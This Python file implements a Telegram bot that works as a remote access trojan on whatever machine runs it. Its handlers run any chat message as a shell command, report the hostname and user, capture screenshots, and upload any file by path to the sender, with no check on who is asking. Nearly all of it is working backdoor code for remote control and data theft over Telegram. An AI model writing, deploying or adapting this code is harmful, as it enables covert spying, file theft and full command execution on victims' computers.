import asyncio
import logging
import sys
from aiogram import Bot, Dispatcher
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command,CommandStart
from aiogram.types import FSInputFile
from aiogram.types import Message
import subprocess
from PIL import ImageGrab
import time
TOKEN = ("YOUR_TOKEN")


dp = Dispatcher()


def execute_system_command(cmd):
    max_message_length = 2048
    output = subprocess.getstatusoutput(cmd)

    # Shorten response if greater than 4096 characters
    if len(output[1]) > max_message_length:
        return str(output[1][:max_message_length])

    return str(output[1])
@dp.message(CommandStart())
async def command_start_handler(message: Message) -> None:
    """
    This function handles the /start command inputted by the user.
    """

    hostname = execute_system_command("hostname")
    current_user = execute_system_command("whoami")
    response = f"Running as: {hostname}/{current_user}"
    await message.answer(response)

@dp.message(Command("screenshot"))
async def screenshot(message: Message) -> None:
    timestamp = int(time.time())
    file_name = f"{timestamp}.png"
    screenshot = ImageGrab.grab()
    screenshot.save(file_name)
    image = FSInputFile(path=file_name,filename=file_name)

    await message.reply_photo(photo=image)


@dp.message(Command("download"))
async def download_file(message: Message)->None:

    """Download a file of choice."""

    if len(message.text.split(' ')) != 2:
        return

    file_path = message.text.split(' ')[1]
    try:
        await message.reply_document(FSInputFile(path=file_path,filename=file_path))
        await message.reply("Downloaded successfully")

    except Exception as e:
        await message.reply(f"Unsuccessful: {e}")

@dp.message()
async def any_command(message: Message) -> None:
    """
    This handles handes all types of commands. It will try to execute any command that
    it receives (if it is valid, of course).
    """
    if message.text.startswith("/start"):
        return

    response = execute_system_command(message.text)
    await message.reply(response)


async def main() -> None:
    bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    await dp.start_polling(bot)



if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, stream=sys.stdout)
    asyncio.run(main())